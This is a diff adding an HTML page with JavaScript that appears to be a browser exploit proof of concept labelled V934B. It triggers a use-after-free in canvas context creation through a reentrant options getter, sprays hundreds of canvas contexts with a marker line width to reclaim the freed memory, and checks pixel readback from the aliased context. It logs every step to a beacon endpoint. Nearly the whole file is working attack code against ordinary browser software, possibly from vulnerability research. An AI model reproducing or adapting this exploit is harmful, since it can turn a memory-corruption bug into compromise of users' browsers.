@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>V934B</title></head>
+<body><pre id="out">V934B — readback verify: sampled pixels + sum (alias vs normal, B)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,body){
+  try{new Image().src='/beacon/V934B-'+tag+'?d='+encodeURIComponent(String(body).slice(0,500))+'&t='+Date.now()+'&s=1';}catch(e){}
+}
+function px(d,w,x,y){ var i=(y*w+x)*4; return [d[i],d[i+1],d[i+2],d[i+3]].join(':'); }
+function sumAll(d){ var s=0; for(var i=0;i<d.length;i++) s=(s+d[i])&0xffffffff; return (s>>>0).toString(16); }
+function sample(d,w,pts){
+  var a=[]; for(var i=0;i<pts.length;i++){ var p=pts[i]; a.push(p[0]+','+p[1]+'='+px(d,w,p[0],p[1])); }
+  return a.join('|');
+}
+function step(name, fn){
+  try{ bk('S-PRE',name); var r=fn(); bk('S-OK',name+'|'+String(r).slice(0,460)); say('S-OK '+name+' '+r); return r; }
+  catch(e){ bk('S-ERR',name+'|'+e.name+':'+String(e.message).slice(0,160)); say('S-ERR '+name+' '+e.message); return null; }
+}
+
+var P=new URLSearchParams(location.search);
+var NSAVES=+(P.get('saves')||'32');
+var NSPRAY=+(P.get('spray')||'300');
+var MARKER=+(P.get('marker')||'7777.77');
+var PTS=[[0,0],[3,3],[6,6],[12,12],[1,1]];
+
+bk('BOOT','saves='+NSAVES+',spray='+NSPRAY);
+
+/* UAF (V573 pattern) */
+var innerCtx=null;
+(function(){
+  var c=document.createElement('canvas'); c.width=1; c.height=1;
+  var d={};
+  Object.defineProperty(d,'alpha',{get:function(){
+    var ctx=c.getContext('2d'); innerCtx=ctx;
+    for(var s=0;s<NSAVES;s++) ctx.save();
+    ctx.lineWidth=1.0; return true;
+  }});
+  try{ c.getContext('bitmaprenderer',d); }catch(e){ bk('TRIG-ERR',e.message); }
+})();
+
+var sprayCtxs=[], sprayCanv=[];
+for(var i=0;i<NSPRAY;i++){
+  var sc=document.createElement('canvas'); sc.width=16; sc.height=16;
+  var sctx=sc.getContext('2d');
+  if(sctx){ sctx.lineWidth=MARKER; sprayCtxs.push(sctx); sprayCanv.push(sc); }
+}
+bk('SPRAY','n='+sprayCtxs.length);
+
+var lwR, aliasCtx=null, aliasIdx=-1, aliasCanv=null, errR;
+try { lwR=innerCtx.lineWidth; } catch(e){ errR='lw:'+e.message; }
+if(!errR && lwR===MARKER){
+  bk('RECLAIM','CONFIRMED');
+  try{ innerCtx.lineWidth=9999.99; }catch(e){}
+  for(var i=0;i<sprayCtxs.length;i++){
+    try{ if(sprayCtxs[i].lineWidth===9999.99){ aliasCtx=sprayCtxs[i]; aliasIdx=i; aliasCanv=sprayCanv[i]; break; } }catch(e){}
+  }
+  bk('ALIAS','idx='+aliasIdx+',found='+(aliasCtx?'1':'0'));
+} else { bk('RECLAIM','NO-marker lw='+lwR); }
+
+var live = aliasCtx || innerCtx;
+var canv = aliasCanv || (function(){ var c=document.createElement('canvas'); c.width=16; c.height=16; return c; })();
+
+function baseline(ctx,c){
+  ctx.setTransform(1,0,0,1,0,0);
+  ctx.globalAlpha=1; ctx.shadowBlur=0; ctx.shadowColor='rgba(0,0,0,0)'; ctx.shadowOffsetX=0; ctx.shadowOffsetY=0;
+  ctx.globalCompositeOperation='source-over';
+  ctx.clearRect(0,0,c.width,c.height);
+  ctx.fillStyle='#102030'; ctx.fillRect(0,0,c.width,c.height);
+  ctx.fillStyle='#a0b0c0'; ctx.fillRect(4,4,8,8); /* covers 4..11,4..11 */
+}
+function report(d,w){ return 'sum='+sumAll(d)+'|'+sample(d,w,PTS); }
+
+function case_transform(ctx,c){ baseline(ctx,c); ctx.translate(2,1); ctx.fillStyle='#ff8844'; ctx.fillRect(2,2,6,6); }
+function case_shadow(ctx,c){ baseline(ctx,c); ctx.shadowColor='rgba(255,0,0,128)'; ctx.shadowBlur=4; ctx.shadowOffsetX=1; ctx.shadowOffsetY=1; ctx.fillStyle='#00ff00'; ctx.fillRect(3,3,6,6); }
+function case_clip(ctx,c){ baseline(ctx,c); ctx.save(); ctx.beginPath(); ctx.rect(4,4,8,8); ctx.clip(); ctx.fillStyle='#ffffff'; ctx.fillRect(0,0,c.width,c.height); ctx.restore(); }
+function case_alpha(ctx,c){ baseline(ctx,c); ctx.globalAlpha=0.5; ctx.fillStyle='#ff0000'; ctx.fillRect(2,2,10,10); }
+
+function runPair(name, fn){
+  step('normal-'+name, function(){
+    var nc=document.createElement('canvas'); nc.width=16; nc.height=16; var nctx=nc.getContext('2d');
+    fn(nctx,nc); return report(nctx.getImageData(0,0,16,16).data,16);
+  });
+  step('alias-'+name, function(){
+    fn(live,canv); return report(live.getImageData(0,0,16,16).data,16);
+  });
+}
+function runBasePair(){
+  step('normal-base', function(){
+    var nc=document.createElement('canvas'); nc.width=16; nc.height=16; var nctx=nc.getContext('2d');
+    baseline(nctx,nc); return report(nctx.getImageData(0,0,16,16).data,16);
+  });
+  step('alias-base', function(){
+    baseline(live,canv); return report(live.getImageData(0,0,16,16).data,16);
+  });
+}
+
+if(live){
+  bk('RV-START','target='+(aliasCtx?'alias-spray#'+aliasIdx:'innerCtx'));
+  runBasePair();
+  runPair('transform', case_transform);
+  runPair('shadow', case_shadow);
+  runPair('clip', case_clip);
+  runPair('alpha', case_alpha);
+  bk('RV-DONE','complete');
+} else {
+  bk('RV-SKIP','no-live-ctx');
+}
+
+bk('DONE','complete');
+say('\nV934B complete.');
+</script>
+</body></html>
